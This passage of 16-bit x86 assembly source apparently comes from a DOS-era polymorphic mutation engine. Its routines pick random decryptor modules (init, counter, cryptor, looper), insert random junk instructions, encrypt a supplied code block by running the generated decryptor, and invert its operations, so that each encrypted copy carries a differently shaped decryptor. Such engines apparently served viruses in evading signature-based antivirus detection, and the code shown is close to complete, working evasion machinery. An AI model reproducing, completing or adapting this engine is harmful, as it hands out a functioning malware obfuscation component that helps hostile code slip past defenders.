        MOV AL,[SI+2]       ;Load AX with module size
        XOR AH,AH
        
        CMP BP,1
        JE ZEROOK
        CMP AX,1        ;Avoid getting single byte code unless we need to
        JE CHOOSEAGAIN
       ZEROOK:
	CMP AX,BP           ;Check if too big to parse in
        JG CHOOSEAGAIN


        CMP SI,w[PREVMOD]
        JE CHOOSEAGAIN       ;Make sure aint equal to previously used module

        MOV CL,[SI+3]        ;Load CL with general mod header
        PUSH BP              ;Save BP in case wrong module
        SUB BP,AX            ;Find left over size for RS insertions
        
        CALL CHECKGENMOD
        OR CL,CL             ;Check if Zero

        JZ ISOK      ;If not, then choose again
        POP BP       ;Restore BP
        JMP CHOOSEAGAIN

       ISOK:
        POP DX               ;Get rid of old BP on stack
        MOV w[PREVMOD],SI     ;Save MOD in use
        RET

;==============================Leftover=====================================
;To save code for loader routines
LEFTOVER:

        CALL PARSEMOD ;Parse and insert module
     LEFTOVER2:
        POP DX        ;DX contains calling BP (MAXJUNK for count module)
        SUB DX,BP     ;BP contains total codesize inserted including RSJunks
        MOV BP,DX     ;Leftover into BP
        RET

;=================================Load Init=================================
LOADINIT:
;BP = max size to find
;Returns, SI pointer to module Header        
;BP size of each RS insertion

        PUSH BP

        MOV SI,OFFSET INITSTART
        CALL FINDMODULE

        MOV AL,[SI+4]        ;Specific Module Header
        OR AL,10000000xB     ;Set the flag for init module being parsed in
        OR [FLAG2],AL        ;Set Flag2 to init specific header
        
        JMP LEFTOVER SHORT

;==================================Load Junk================================
LOADJUNK:
;BP = max size to find
;Returns, SI pointer to module Header
;BP size of each RS insertion
;Return leftover BP

        PUSH BP
        PUSH SI
        OR BP,BP      ;Check if we are trying to find 0 size junk
        JZ ZEROSIZE

        PUSH BP
       ANOTHERJUNK:
        POP BP
        PUSH BP

        MOV SI,OFFSET JUNKSTART
        CALL FINDMODULE

        MOV AL,[SI+4]        ;Specific Module Header
        TEST AL,00000001xB   ;test if we need init module to have passed
        JZ NOREQS
        
        MOV AH,b[FLAG2]
        TEST AH,10000000xB    ;flag for init module to have passed
        JZ ANOTHERJUNK

       NOREQS:
        POP AX
        CALL PARSEMOD
       ZEROSIZE:
        POP SI
        JMP LEFTOVER2 SHORT

;=================================Load Counter==============================
LOADCOUNT:
;BP = max size to find
;Check specific module header, make sure compatible with init
;Load counter variable for use with Looper load to find right one
;Load index modification variable to find right cryptor
;SUB (MAX BP),(BP)


        PUSH BP
        MOV SI,OFFSET COUNTSTART

      ANOTHERMOD:
        POP BP
        PUSH BP
        CALL FINDMODULE
        MOV AL,[SI+4]        ;Specific Module Header
        
        AND AL,00110000xB    ;---Set flag for looper size req---
        SHR AL,4             ;Get counter decrease in counter
        MOV CL,[FLAG2]       ;Get counter size being used
        AND CL,00000011xB    ;If *1 and counter is 2 then we need another
        CMP AL,CL            ;CL should be larger (or equal) to AL
        JG ANOTHERMOD        ;Get another module if decreases by too much

        SUB CL,AL            ;AL contains looper size needed
        CMP CL,1             ;If *2 and counter is 0 we need another
        JG ANOTHERMOD        ;Must be 0 or 1 away from target
        SHL CL,4
        OR [FLAG2],CL        ;Set flag for looper size req

        MOV AL,[SI+4]
        AND AL,00001100xB    ;Set flag for index mod required
        OR [FLAG2],AL

        JMP LEFTOVER SHORT

;=================================Load Cryptor==============================
LOADCRYPT:
;Make sure compatible with counter
        PUSH BP
        MOV SI,OFFSET CRYPTSTART

       ANOTHERCRYPT:
        POP BP
        PUSH BP
        CALL FINDMODULE

        MOV AL,[SI+4]        ;Specific Module Header
        MOV AH,[FLAG2]
        AND AH,00001100xB    ;Get Index increase we want
        CMP AL,AH            ;If not equal then get another

        JNE ANOTHERCRYPT
        JMP LEFTOVER SHORT

;=================================Load Looper===============================
LOADLOOP:
;Make sure compatible with counter and init

        PUSH BP

        MOV SI,OFFSET LOOPSTART

       ANOTHERLOOP:
        POP BP
        PUSH BP

        CALL FINDMODULE
        MOV AL,[SI+4]        ;Specific Module Header
        MOV AH,[FLAG2]
        AND AH,00110000xB    ;Get counter increase we want
        CMP AL,AH            ;If not equal then get another
        JNE ANOTHERLOOP
        JMP LEFTOVER SHORT

;[======================Parse Code===========================================]
;Looks at high 3 bits of CL for code
               ;CL contains code
               ;CH contains 8 bit offset for code
               ;AL contains Byte
               ;DI contains insertion point
               ;ES contans segment for insertion
               ;DS contains segment of module
               ;BP contains MAX RS size (for junk insertion)
               ;BX contains offset of 1st header code
               ;SI contains offset from BX of header code
               ;DX contains Offset of first machine byte in ES

;Returns CL to be OR'd onto AL
;May modify AL

PARSECODE:
       PUSH CX
       AND CL,11100000xB ;Mask off everything but high 3 code
       XOR CH,CH
       SHR CL,5
       INC CX

       LOOP PCODE1       ;CL = 000XXXXXxB - Choose Fixed Reg Code
         POP CX
         JMP CHOOSE_REG

       PCODE1:           ;CL = 001XXXXXxB - Choose Random Reg Code
       LOOP PCODE2
         POP CX
         JMP CHOOSE_RAND

       PCODE2:           ;CL = 010XXXXXxB - Byte Register Code
       LOOP PCODE3
         POP CX
         JMP CHOOSE_BYTE

       PCODE3:           ;CL = 011XXXXXxB - Offset Relocation Code
       LOOP PCODE4
         POP CX
         JMP CHOOSE_OFFSET

       PCODE4:           ;CL = 100XXXXXxB - Junk Insertion Code
       LOOP PCODE5
         POP CX
         JMP CHOOSE_JUNK

       PCODE5:           ;CL = 101XXXXXxB - Values Code
       LOOP PCODE6
         POP CX
         JMP CHOOSE_VALUE

       PCODE6:           ;CL = 110XXXXXxB - Misc Opcde Manip
       LOOP PCODE7
         POP CX
         JMP CHOOSE_OPCODE

       PCODE7:           ;CL = 111XXXXXxB - Reserved / Debug
         POP CX
         XOR CX,CX
         INT 3
         RET

;===========================Junk Filler======================================
;Essentially uses the FIXEJUNK function to generate an RSJ using code

JUNKFILL:
        MOV BX,BP
        INC BX            ;In case its zero
        CALL RANDNUM
        MOV CL,090
        MOV BP,DX
        INC BP
        JMP FIXEDJUNK    ;May generate zero size junk

;[===================Parse Module Function===================================]
;Return total increase in codesize in BP
;(Final DI-First DI)
;DS:SI = Header of module to parse
;ES:DI = place to insert
;BP = max RS junk insert size

PARSEMOD:

        PUSH DI        ;Save Offset of current engine place

        XOR DH,DH
        MOV DL,[SI+2]  ;8 bit code size
        INC DX         ;So we parse any header codes after machine code
        PUSH DX        ;Save size of code to stack

        ADD SI,06      ;Move to 1st header code
        PUSH SI        ;Offset to 1st header code

        MOV AL,[SI-1]  ;Number of codes
        SHL AL,1       ;2 * Number of codes
        XOR AH,AH
        ADD SI,AX      ;First piece of code in module
        MOV BX,SI      ;Offset of First piece of code

        XOR SI,SI      ;Index to zero

;--------------------------

PARSENEXTBYTE:

        MOV AL,[BX+SI]   ;Load byte from Module

;---------------Check Through Offsets in Header----------------------

        POP CX        ;Pop off offset to first header code
        PUSH BX       ;BX = offset first machine code
        PUSH SI       ;SI = offset current machine code
        MOV BX,CX     ;Mov offset to 1st header code into BX
        XOR SI,SI     ;Set index to first header code

               XOR CH,CH
               MOV CL,[BX-1]  ;Load amount of codes
               OR CL,CL
               JZ  NOCODES

             ;-------------------------------
             HEADERSEARCH:
               PUSH CX
               MOV CX,[BX+SI]      ;Load code and offset

               ;----------------
               PUSH SI
               CLI
               MOV SI,SP
               SS MOV DL,b[SI+4]    ;Get offset for current machine code
               STI
               CMP CH,DL            ;CH contains offset for code, DL contains
              JE FOUNDONE           ;old SI which is offset from BX
               POP SI
              JMP GETNEXTHEADER    ;Incorrect offset so search again
               ;----------------
              FOUNDONE:

               MOV SI,SP
               SS MOV DX,w[SI+0A]   ;Load DX with start of module in ES
               POP SI

               ;==========
               ;Do a check for a fixed size insertion
               ;and subtract the size from the code size
               PUSH AX
               XOR AH,AH
               MOV AL,CL
               AND AL,11100000xB
               CMP AL,10000000xB   ;Junk insertion
               JNE NOJUNK
               MOV AL,CL
               AND AL,00001111xB
               PUSH SI
               CLI
               MOV SI,SP
               SS SUB [SI+0A],AX   ;SI+10 = Code size
               STI
               POP SI
              NOJUNK:
               POP AX
               ;==========

               ;CL contains code
               ;CH contains 8 bit offset for code
               ;AL contains Byte
               ;DI contains insertion point (in ES)
               ;ES contans segment for insertion
               ;DS contains segment of module
               ;BP contains MAX RS size (for junk insertion)
               ;BX contains offset of 1st header code (in CS)
               ;SI contains offset from BX of header code (in CS)
               ;DX contains Offset of first machine code (in ES)

               PUSH BX
               PUSH BP
               PUSH SI
               CALL PARSECODE  ;Get byte to change AL
               POP SI
               POP BP
               POP BX

               OR AL,CL ;<- AL contains new byte, CL contains returned code

             GETNEXTHEADER:
               INC SI
               INC SI        ;Get next header code&offset
               POP CX
             LOOP HEADERSEARCH

     NOCODES:
        POP SI         ;Restore current machine code offset
        MOV CX,BX      ;Save 1st header into CX
        POP BX         ;Restore 1st machine code instr
;-------------------------------------------------------------------

        INC SI             ;Advance to next machine code byte
        POP DX
        CMP DX,SI          ;Check if at end of code
       JZ ENDOFCODE
        PUSH DX            ;Put back on machine code size
        PUSH CX            ;Put back on offset to 1st header code

        ;!!! DEBUG !!!
        ;CALL HEXDIS

        CLD
        STOSB              ;Store AL to ES:DI, advance DI
        INC w[ENGINESIZE]
       JMP PARSENEXTBYTE

       ENDOFCODE: 
        POP AX        ;Pop original DI into AX
        MOV BP,DI     ;New DI into BP
        SUB BP,AX     ;BP = increase in size this MOD has caused
        RET           ;Including any RSI's

;===================Generate Engine Code===================================]
;Segment for Generation is at ES:DI
;Segment of Code is at DS:SI
;Segment of Modules = CS
;Code size passed in CX
;Generate engine at ES
        
GENERATE:
        PUSH AX
        PUSH CX
        PUSH DX
        PUSH BX
        PUSH BP

        PUSH SI
        PUSH DI
        PUSH CX
        CALL INITREGS
        POP CX
        POP DI
        POP SI

        PUSH SI      ;Offset of code  (DS:SI)
        PUSH DI      ;Offset of Engine (ES:DI)
        MOV W[DSEGSAVE], DS      ;Segment of code (DS:SI)
        PUSH CS
        POP DS       ;Make DS segment CS

        MOV BX,0FFFE
        CALL RANDNUM
        MOV [RANDGEN1],DX
        MOV BX,0FFFE
        CALL RANDNUM
        MOV [RANDGEN2],DX             ;Set up random numbers

        MOV [CODESIZE],CX             ;Store Codesize
        MOV w[ENGINESIZE],0

;-------------------------------------------------------

        ;!!!!!!!!!! DEBUG !!!!!!!!!!!!
        #if DEBUG
        MOV AL,0CC
        STOSB               ;Store INT 3 and increase DI
        #endif
        ;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!


        MOV BP,MAXLONGSIZE
        PUSH BP
        CALL JUNKFILL         ;BP = MaxLong
        POP BP
        PUSH BP
        CALL LOADINIT         ;BP = Maxlong
        CALL JUNKFILL
        POP BP
        MOV BP,MAXMODSIZE
        MOV [EDLOOPSTART],DI
        PUSH BP                 ;BP = Max      } +32
        CALL JUNKFILL
        POP BP
        PUSH BP
        CALL LOADCOUNT          ;BP = MAX      }
        CALL JUNKFILL           ;BP = leftover } +32
        POP BP
        PUSH BP
        CALL LOADCRYPT          ;BP = MAX      }
        CALL JUNKFILL           ;BP = leftover } +32
        POP BP
        CALL LOADLOOP           ;BP = MAX      } +32
                                               ; = Max total of 128 (perfect)
        CALL JUNKFILL           ;BP = Leftover

;------------------------------------------------

        ;DI = place to insert next module (decryptor size+1)
        ;Decryptor size 'cause from ES:0

        MOV w[BYTEOFF],DI      ;Put offset to place a RETF
        
	MOV AX,DI
        AND AX,0F             ;Just get the last 4 bits
        XOR AL,0F             ;Reverse it to see amount to get to para
        INC AX
        MOV BP,AX             ;Size of fixed
        MOV CL,090            ;To make sure 'code' is used        CALL FIXEDJUNK        ;Call junk to align to paragraph
                              ;DI contains offset for next instruction
	CALL FIXEDJUNK
        
	;'Cause Counter mods are called before crypt

        MOV SI,w[EDCODESTART]
        DEC SI
        ES MOV [SI],DI           ;Change pointer in code
        ES SUB w[SI],2           ;Cause is incremented before applied
        MOV [DECRYPTEND],DI

        POP DX                  ;ES:DI(DX) place to put engine
        POP SI                  ;DS:SI(SI) place of code
        PUSH DX                 ;Push Decryptor start onto stack
        CALL REVERSENG          ;Encrypt code and make reversed engine

        POP DI                  ;DI = offset of decryptor, ES = seg
        MOV SI,w[ENGINESIZE]    ;SI = size of engine including encrypted code
        POP BP                  ;Restored
        POP BX                  ;Restored
        POP DX                  ;Restored
        POP CX                  ;CX still contains code size
        POP AX                  ;Restored
        RET

;===========================Reverse Engine==================================
REVERSENG:
;Copy DS:SI to codesize at ES:DI after Engine at ES:DX
;Far Call to ES:DX, pushing CS:IP beforehand

;Set DS=CS, ES still points to start of engine
;Reverses each E/D in the New engine
;Restore byte replaced with RETF
;Decryptor and encrypted Code complete

;Start address of decryptor = DX
;Seg of decryptor = ES
;Start of Code = DS:SI
;Place to put code ES:DI

       ;Place a RETF

	MOV BX,[BYTEOFF]         ;Load offset into BX of byte in ES
        ES MOV AL,b[BX]             ;Load byte stored at offset
        MOV b[STOREBYTE],AL      ;Backup byte
        ES MOV b[BX],0CB            ;Place an RETF

        MOV CX,[CODESIZE]
        SHR CX,1                ;Divide size by 2

        MOV DS,w[DSEGSAVE]      ;Load in segment of code
       PUSH SI
        REP MOVSW               ;Copy from DS:SI to ES:DI
       POP SI

        MOV AX,ES
        CS MOV w[OFFSET JMPOFF],AX    ;Modify immediate jmp
        CS MOV w[OFFSET JMPOFFW],DX

        MOV BX,DI               ;DI = End of (decryptor+code)
        SUB BX,DX               ;DX = Start of decryptor
        CS MOV w[ENGINESIZE],BX ;ENGINESIZE = decryptor+code
        PUSH DI                 ;DI advanced to end of code+decryptor

        DB 09A              ;Far Call
       JMPOFFW:
        DW ?
       JMPOFF:
        DW ?

        POP DI                  ;Restore End of decryptor
        PUSH CS
        POP DS           ;Make DS=CS again

        MOV SI,w[CRYPT_ENGINE_T]         ;Load offset of last entry

       NEXTENTRY:
        CMP SI,OFFSET CRYPT_ENGINE_T     ;Check if we are at the start
        JE MIDDLEPOINT       ;Incase there are no values

        MOV CL,b[SI]     ;Load modrm3 value
	MOV BX,w[SI+1]   ;Load offset in ES of value (inverse)

  	TEST CL,01000000xB	;Test INC/DEC/NEG/NOT flag
	JZ ATYPE
	AND CL,00111000xB	;Mask off flags in modrm
	TEST CL,00010000xB	;Check if bigger than 1 (NEG/NOT)
	JZ ITYPE
	ES AND b[BX-1],11110111xB ;Change opcode value (NEG/NOT)	
	JMP ATYPE SHORT
      ITYPE:
	ES OR b[BX-1],11111111xB  ;Change opcode value (INC/DEC)

      ATYPE:    	
        ES AND b[BX],11000111xB	;Clear 3 bits of crypt
	ES OR b[BX],CL        	;Load in 3 bits of crypt

        SUB SI,3             ;Move up table
        JMP NEXTENTRY SHORT
       MIDDLEPOINT:

	MOV BX,w[BYTEOFF]        ;Load offset into BX of byte in ES
        MOV AL,b[STOREBYTE]      ;Load old byte into AL
        ES MOV b[BX],AL          ;Restore Byte

RET

;============================Restore Tables================================
RESTORETABLES:
        ;Reset Save/Restore Stack
        ;MOV [RESAVSP],OFFSET RESAVSP ;Not necessary, unless bugs
        ;Reset Encrypt/Decrypt Table
        MOV w[CRYPT_ENGINE_T],OFFSET CRYPT_ENGINE_T

        ;Reset Register Table
        MOV CX,08
        MOV DI,OFFSET REG_STOR
       RESET:
        MOV b[DI],_SP
        INC DI
        LOOP RESET

        ;Reset Variables
        MOV DI,OFFSET ENGINESIZE
        MOV w[DI],0
        MOV w[DI+2],0

        ;Randomize Random Number Generator BX contains whatever (not matter)
        MOV BX,0FEED
        JMP RANDNUM

;===========================================================================
HOPE_END:
